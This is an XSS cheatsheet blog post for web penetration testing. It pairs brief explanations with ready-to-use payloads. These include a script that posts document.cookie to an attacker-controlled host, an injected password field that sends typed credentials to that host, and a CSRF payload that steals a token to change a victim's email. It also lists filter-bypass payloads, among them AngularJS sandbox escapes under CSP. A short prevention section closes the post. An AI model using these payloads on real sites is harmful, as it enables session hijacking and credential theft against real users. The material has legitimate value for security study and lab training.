---
title: "XSS attack"
subtitle: ""
draft: false
author: "Hato0"
description: "XSS cheatsheet"

tags: ["web", "penetest", "xss"]
categories: ["Penetest - Web"]

hiddenFromHomePage: true
hiddenFromSearch: false
twemoji: false
lightgallery: false
ruby: false
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false
toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
share:
  enable: true
comment:
  enable: true
---
# Cross-site scripting

Cross-site scripting is used to inject malicious javascript code to user browser. 

This attack can lead to a total control of the application in use. More details and specific stuff can be found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

## Basics


- Exploiting cross-site scripting to steal cookies
	This part represent the principal use of XSS. Web apps usually use cookies to save and remember sessions. 
    
    In that way, this attack get the cookie in question and send it back to your own domain so you can easily capture it. 
	
	There is comon security system used to avoid this attack:
	-   The victim might not be logged in.
	-   Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
	-   Sessions might be locked to additional factors like the user's IP address.
	-   The session might time out before you're able to hijack it.
	
	Here is an example of that type of XSS:
        {{< highlight javascript "lineNos=false" >}}<script> 
            fetch('https://MYDOMAIN', {  method: 'POST',  mode: 'no-cors',  body:document.cookie  });  
        </script>
        {{< /highlight >}}


- Exploiting cross-site scripting to capture passwords
	
	This technique can be use because of stupid password managers and auto-fill option. Basicly the only thing you have to do is to inject an option in the input label to read data when they are enter. Here is an example : 
	
    {{< highlight html "lineNos=false" >}}
    <input name=username id=username>  
    <input type=password name=password onchange="
    if(this.value.length)fetch('https://MYDOMAIN',{  
    method:'POST',  
    mode: 'no-cors',  
    body:username.value+':'+this.value  
    });">
    {{< /highlight >}}


- Exploiting XSS to perform CSRF

	XSS can also be used to perform CSRF (more details in the next section). Here is an example payload working with token protection enable: 
	
	{{< highlight javascript "lineNos=false" >}}
	<script>  
	var req = new XMLHttpRequest();  
	req.onload = handleResponse;  
	req.open('get','/my-account',true);  
	req.send();  
	function handleResponse() {  
	 var token = this.responseText.match(/name="csrf" value="(\\w+)"/)\[1\];  
	 var changeReq = new XMLHttpRequest();  
	 changeReq.open('post', '/my-account/change-email', true);  
	 changeReq.send('csrf='+token+'&email=test@test.com')  
	};  
	</script>
	{{< /highlight >}}


## Reflected XSS 

Reflected XSS is the simplest variety of cross-site scripting. The application receive data in an HTTP request and includes that data within the immediate response in an unsafe way. Nothing is stored in the webapp and the trigger only works when the user click on the link or whatever with this particular payload include. Here are some examples : 

- HTML context with nothing encoded

	{{< highlight javascript "lineNos=false" >}}
	<script>alert(1)</script>
	{{< /highlight >}}
 
 
- HTML context with most tags and attributes blocked

	{{< highlight html "lineNos=false" >}}
	<iframe src="https://WEBSITE/?search="><body onresize=alert(document.cookie)>" onload=this.style.width='100px'>
	{{< /highlight >}}


- HTML context with all tags blocked except custom ones

	{{< highlight javascript "lineNos=false" >}}
	<script>  
	location = 'https://WEBSITE/?search=<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x';  
	</script>
	{{< /highlight >}}


- Event handlers and href attributes blocked

	{{< highlight javascript "lineNos=false" >}}
	https://WEBSITE/?search=<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>
	{{< /highlight >}}

- Some SVG markup allowed

	{{< highlight javascript "lineNos=false" >}}
	https://WEBSITE/?search="><svg><animatetransform onbegin=alert(1)>
	{{< /highlight >}}


- Reflected XSS with AngularJS sandbox escape without strings

	{{< highlight javascript "lineNos=false" >}}
	https://your-lab-id.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d\[\].join;\[1\]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
	{{< /highlight >}}
	
	
- Reflected XSS with AngularJS sandbox escape and CSP

	{{< highlight html "lineNos=false" >}}
	<script>  
	location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';  
	</script>
	{{< /highlight >}}
	

## Stored XSS 
Stored XSS is an injection in the actual page by any way (message, template injection, input, ...). Here are some examples: 

- Stored XSS into anchor href attribute with double quotes HTML-encoded

	{{< highlight javascript "lineNos=false" >}}
	javascript:alert('XSS')
	{{< /highlight >}}
	 
	 
- Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

	{{< highlight javascript "lineNos=false" >}}
	&apos;-alert(1)-&apos;
	{{< /highlight >}}
	

## DOM XSS 

DOM Based XSS is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

As the vulnaribility is app specific, there will be no example and you will have to use your brain. 


## Escape CSP

CSP or 'Content Security Policy ' is a protection to XSS, clickjacking, code injection and more. CSP can be found on the server answer. You can use a [checker](https://csp-evaluator.withgoogle.com/) to dig in what you have in front of you. As the topic is large again here is a [link](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass) to understand what the checker gave you 


## How to prevent them 

-   **Filter input on arrival.** At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
-   **Encode data on output.** At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
-   **Use appropriate response headers.** To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the `Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way you intend.
-   **Content Security Policy.** As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.